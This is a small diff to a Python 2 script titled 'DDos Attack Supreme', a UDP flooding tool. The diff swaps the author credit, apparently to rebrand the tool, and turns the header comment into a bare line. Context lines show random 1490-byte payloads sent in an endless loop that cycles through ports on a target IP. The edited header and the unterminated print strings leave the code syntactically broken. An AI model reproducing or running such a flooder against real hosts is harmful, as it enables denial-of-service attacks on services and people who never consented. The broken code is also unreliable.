@@ -1,4 +1,4 @@
-# DDOS-
+DDOS-
 import sys
 import os
 import time
@@ -21,7 +21,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack Supreme")
 print
-print "Author   : Supreme_NewBoy
+print "Author   :Kahfiramaadev
 print "github   : https://github.com/Kahfiramaadev
 print "Facebook : https://www.facebook.com/kahfiramaa
 print "instagram : https://www.instagram.com/kahfiramaa
@@ -49,5 +49,7 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
+
 
 
